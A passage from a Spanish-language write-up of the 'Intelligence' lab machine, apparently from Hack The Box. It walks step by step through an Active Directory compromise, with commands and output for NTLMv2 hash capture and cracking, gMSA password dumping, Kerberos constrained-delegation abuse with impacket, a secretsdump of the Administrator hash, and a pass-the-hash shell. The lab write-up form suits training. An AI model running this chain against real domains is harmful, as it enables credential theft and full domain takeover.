     Responder DCE-RPC Port     [46118] 

     [+] Listening for events...                                                                                                                                                                                      

     [HTTP] NTLMv2 Client   : 10.10.10.248
     [HTTP] NTLMv2 Username : intelligence\Ted.Graves
     [HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:6b8d0b1c5bc328f7:FA9F4228C061595A825CD3CF92B2F4E0:
     01010000000000006B99E0AB9457D901625E2B106F7F6EBC0000000002000800300035003500540001001E00570049004E0
     02D003900310055004B00370046003100520057004E0044000400140030003500350054002E004C004F00430041004C0003
     003400570049004E002D003900310055004B00370046003100520057004E0044002E0030003500350054002E004C004F004
     30041004C000500140030003500350054002E004C004F00430041004C000800300030000000000000000000000000200000
     B5F3481E099A39EABA73AD4A2AB9D4F6CC62A4CBA31C11EB0FB72396CDFB15B60A001000000000000000000000000000000
     0000009003E0048005400540050002F007700650062006100740072006500750073002E0069006E00740065006C006C0069
     00670065006E00630065002E006800740062000000000000000000                                                                                        
     [+] Exiting...

## [](header-2)Cracking john

     ❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
     Using default input encoding: UTF-8
     Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
     Will run 2 OpenMP threads
     Press 'q' or Ctrl-C to abort, almost any other key for status
     Mr.Teddy         (Ted.Graves)     
     1g 0:00:00:06 DONE (2023-03-15 17:28) 0.1631g/s 1764Kp/s 1764Kc/s 1764KC/s Mrz.elmo\\'sboo..Mr Bean
     Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
     Session completed.

obtuvimos credenciales validas

     crackmapexec smb 10.10.10.248 -u 'Ted.Graves' -p 'Mr.Teddy' 
     SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
     SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy 


## [](header-2)Bloodhound-Python

     bloodhound-python -c all -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb
     neo4j console #iniciando database#
     http://localhost:7474 #nos logueamos con nuestras credenciales#
     bloodhound &>/dev/null & #iniciamos bloodhound#

como siempre marcamos con la calavera a los usuarios pwneados

     Ted.Graves
     Tiffany.Molina

vamos al usuario Ted.Graves y vemos que puede hacer cositas

Después de un tiempo, Bloodhound nos muestra un camino desde el usuario Ted.Graves hasta el controlador de dominio, 
nos muestra que Ted.Graves es miembro del grupo ITSUPPORT que tiene el permiso ReadGMSAPassword en la cuenta SVC_INT. 
Esto significa que podemos leer la contraseña de la cuenta SVC_INT y, por lo tanto, comprometerla.

también muestra que la cuenta SVC_INT tiene el permiso AllowedToDelegate en el controlador de dominio! 
Esto significa que SVC_INT puede realizar Delegación restringida de Kerberos en el controlador de dominio objetivo.
En consecuencia, la cuenta SVC_INT puede suplantar a cualquier usuario al acceder a cualquier servicio que se ejecute 
en el controlador de dominio. Como tal, podríamos abusar de este permiso para comprometer la cuenta de administrador 
que tiene acceso administrativo en el controlador de dominio.

     ❯ python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -l 10.10.10.248 -d intelligence.htb
     Users or groups who can read password for svc_int$:
      > DC$
      > itsupport
     svc_int$:::9ee6005cc12d8337df1dc46d481ec7ce
     svc_int$:aes256-cts-hmac-sha1-96:61286fe7e51555b111b4d3e8e023f991997b9e5db2e88c33e79e7d9aedb6d273
     svc_int$:aes128-cts-hmac-sha1-96:880d93422b38c2c14dd347a3d8e7f956

Antes de poder abusar del permiso AllowedToDelegate, necesitamos conocer el nombre principal 
del servicio (SPN) del controlador de dominio. Podemos encontrar esta información en Bloodhound seleccionando el 
nodo SVC_INT, haciendo clic en la pestaña Node Info y verificando el campo Allowed To Delegate. 
Al observar este campo, podemos descubrir que el SPN del controlador de dominio es WWW/dc.intelligence.htb.

Ahora que tenemos el SPN del controlador de dominio, deberíamos tener todo lo necesario para obtener un 
Ticket Granting Ticket (TGT) para el usuario administrador. Podríamos intentar generar este TGT con Impacket 
como se muestra a continuación. Especificamos el host de destino con la bandera -spn, el hash de contraseña 
para la autenticación con el parametro -hashes, la IP del controlador de dominio con -dc-ip y la cuenta de 
destino a comprometer con -impersonate. Después, especificamos el usuario con el que nos gustaría autenticarnos,
usando el hash que proporcionamos. Tenga en cuenta que el formato del hash proporcionado con el parametro -hashes 
debe ser LMHASH:NTHASH. Sin embargo, como el hash que filtramos para la cuenta SVC_INT no tenía una parte LM, 
podemos dejar la parte LMHASH en blanco. 

- Importante: tenemos que sincronizar nuestro tiempo con el tiempo del host objetivo ejecutando *"sudo ntpdate -s intelligence.htb"*. 
Una vez que hemos sincronizado nuestro tiempo, podemos ejecutar el comando para generar un TGT

        ❯ impacket-getST -spn WWW/dc.intelligence.htb -dc-ip 10.10.10.248 -hashes :9ee6005cc12d8337df1dc46d481ec7ce -impersonate Administrator intelligence.htb/svc_int
          Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

          [-] CCache file is not found. Skipping...
          [*] Getting TGT for user
          [*] Impersonating Administrator
          [*]     Requesting S4U2self
          [*]     Requesting S4U2Proxy
          [*] Saving ticket in Administrator.ccache

Ahora que hemos obtenido el ticket de servicio Administrator.ccache, necesitamos tenerlo accesible para poder obtener acceso como administrador. 
En este caso, lo estableceremos como la variable de entorno KRB5CCNAME en nuestro sistema para luego usarlo para acceder a la máquina víctima como Administrador.

     ❯ export KRB5CCNAME=Administrator.ccache

y con secretsdump dumpearnos el hash NT del usuario Administrator para realizar un Pass The Hash 
                                                                                                                                                                                                               
     ❯ impacket-secretsdump -k -no-pass dc.intelligence.htb -just-dc-user Administrator
       Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

     [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
     [*] Using the DRSUAPI method to get NTDS.DIT secrets
     Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::
     [*] Kerberos keys grabbed
     Administrator:aes256-cts-hmac-sha1-96:75dcc603f2d2f7ab8bbd4c12c0c54ec804c7535f0f20e6129acc03ae544976d6
     Administrator:aes128-cts-hmac-sha1-96:9091f2d145cb1a2ea31b4aca287c16b0
     Administrator:des-cbc-md5:2362bc3191f23732
     [*] Cleaning up...


     ❯ crackmapexec winrm 10.10.10.248 -u 'Administrator' -H '9075113fe16cf74f7c0f9b27e882dad3'
     SMB         10.10.10.248    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:intelligence.htb)
     HTTP        10.10.10.248    5985   DC               [*] http://10.10.10.248:5985/wsman
     WINRM       10.10.10.248    5985   DC               [+] intelligence.htb\Administrator:9075113fe16cf74f7c0f9b27e882dad3 (Pwn3d!)


## [](header-2)Shell Administrator 

     evil-winrm -i 10.10.10.248 -u 'Administrator' -H '9075113fe16cf74f7c0f9b27e882dad3'

     Evil-WinRM shell v3.4
     Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
     Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
     Info: Establishing connection to remote endpoint

     *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
     intelligence\administrator
     *Evil-WinRM* PS C:\Users\Administrator\Documents> dir


     Directory: C:\Users\Administrator\Documents


     Mode                LastWriteTime         Length Name
     ----                -------------         ------ ----
     d-----        4/18/2021   5:23 PM                WindowsPowerShell


     *Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\
     *Evil-WinRM* PS C:\> dir


     Directory: C:\


     Mode                LastWriteTime         Length Name
     ----                -------------         ------ ----
     d-----        4/18/2021   5:52 PM                inetpub
     d-----        4/18/2021   5:50 PM                IT
     d-----        4/18/2021   5:38 PM                PerfLogs
     d-r---        4/18/2021   5:23 PM                Program Files
     d-----        4/18/2021   5:21 PM                Program Files (x86)
     d-r---        4/18/2021   6:20 PM                Users
     d-----        6/29/2021   2:30 PM                Windows 
     -a----        6/29/2021   2:30 PM           5510 License.txt


     *Evil-WinRM* PS C:\> cd Users
     *Evil-WinRM* PS C:\Users> cd Administrator
     *Evil-WinRM* PS C:\Users\Administrator> dir


     Directory: C:\Users\Administrator


     Mode                LastWriteTime         Length Name
     ----                -------------         ------ ----
     d-r---        4/18/2021   5:40 PM                3D Objects
     d-r---        4/18/2021   5:40 PM                Contacts
     d-r---        4/18/2021   5:40 PM                Desktop
     d-r---        4/18/2021   5:40 PM                Documents
     d-r---        4/18/2021   5:40 PM                Downloads
     d-r---        4/18/2021   5:40 PM                Favorites
     d-r---        4/18/2021   5:40 PM                Links
     d-r---        4/18/2021   5:40 PM                Music
     d-r---        4/18/2021   5:40 PM                Pictures
     d-r---        4/18/2021   5:40 PM                Saved Games
     d-r---        4/18/2021   5:40 PM                Searches
     d-r---        4/18/2021   5:40 PM                Videos


     *Evil-WinRM* PS C:\Users\Administrator> cd Desktop
     *Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


     Directory: C:\Users\Administrator\Desktop


     Mode                LastWriteTime         Length Name
     ----                -------------         ------ ----
     -ar---        3/17/2023   4:47 PM             34 root.txt


     *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
     a1439e0f95c1bfddeacfec70c8d1f071

Esto seria la maquina intelligence, perfecto para practicar Directory Active 

























